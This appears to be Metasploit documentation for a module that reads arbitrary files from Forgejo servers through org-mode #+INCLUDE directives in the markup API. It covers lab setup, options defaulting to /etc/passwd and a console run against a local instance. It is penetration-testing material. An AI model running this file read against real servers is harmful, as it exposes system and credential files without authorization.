## Introduction

This module authenticates to the Forgejo markup rendering API and abuses org-mode `#+INCLUDE` directives to read arbitrary files from the server filesystem.

## Vulnerable Application

Forgejo versions 7.0 through 15.0.5 and 16.0.0 through 16.0.1 are vulnerable to
an arbitrary file read via the markup rendering API endpoint. The `go-org`
library's default `ReadFile` callback (`ioutil.ReadFile`) is not overridden,
allowing the `#+INCLUDE` directive to read arbitrary files accessible to the
service user.

Valid credentials are required to access the API markup endpoint.

### Setup

A vulnerable Forgejo instance can be started with Docker:

```
docker run -d -p 3000:3000 codeberg.org/forgejo/forgejo:15.0.5
```

Or simply download a vulnerable binary [here](https://code.forgejo.org/forgejo/forgejo/releases/tag/v15.0.5).

After setup, create an admin account and at least one repository (public or
private). The module requires valid credentials and a repository context.

## Verification Steps

1. Install a vulnerable Forgejo instance (7.0 through 15.0.5 or 16.0.0-16.0.1)
2. Create a user account and at least one repository
3. Start msfconsole
4. Do: `use auxiliary/gather/forgejo_orgmode_fileread_cve_2026_59774`
5. Do: `set RHOSTS <target>`
6. Do: `set USERNAME <user>`
7. Do: `set PASSWORD <pass>`
8. Do: `run`
9. You should see the contents of `/etc/passwd`

## Options

### FILEPATH

The absolute path of the file to read on the target server. Default: `/etc/passwd`.

### REPO

The repository path in `owner/repo` format. If left blank, the module will
auto-detect a repository via the API using the provided credentials.

### USERNAME

Username for authentication. Required.

### PASSWORD

Password for authentication. Required.

### STORE_LOOT

When set to `true`, stores the retrieved file contents as loot. Default: `true`.

## Scenarios

### Forgejo 15.0.5 on Linux

```
msf auxiliary(gather/forgejo_orgmode_fileread_cve_2026_59774) > use auxiliary/gather/forgejo_orgmode_fileread_cve_2026_59774
msf auxiliary(gather/forgejo_orgmode_fileread_cve_2026_59774) > set USERNAME jvoisin
USERNAME => jvoisin
msf auxiliary(gather/forgejo_orgmode_fileread_cve_2026_59774) > set PASSWORD Testpass123!
PASSWORD => Testpass123!
msf auxiliary(gather/forgejo_orgmode_fileread_cve_2026_59774) > set FILEPATH /etc/hosts
FILEPATH => /etc/hosts
msf auxiliary(gather/forgejo_orgmode_fileread_cve_2026_59774) > check 
[+] 127.0.0.1:3000 - The target appears to be vulnerable. Forgejo 15.0.5 is vulnerable (patched in 15.0.6 / 16.0.2)
msf auxiliary(gather/forgejo_orgmode_fileread_cve_2026_59774) > run
[*] Running module against 127.0.0.1
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Forgejo 15.0.5 is vulnerable (patched in 15.0.6 / 16.0.2)
[*] No REPO specified, searching for a public repository...
[*] Found public repository: jvoisin/public-test
[*] Reading /etc/hosts via markup rendering
[+] Successfully read /etc/hosts (385 bytes)
# Loopback entries; do not change.
# For historical reasons, localhost precedes localhost.localdomain:
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
# See hosts(5) for proper format and other examples:
# 192.168.1.10 foo.example.org foo
# 192.168.1.13 bar.example.org bar
#
[+] File saved to: /home/jvoisin/.msf4/loot/20260812103054_default_127.0.0.1_forgejo.file_233718.txt
[*] Auxiliary module execution completed
msf auxiliary(gather/forgejo_orgmode_fileread_cve_2026_59774) >
```
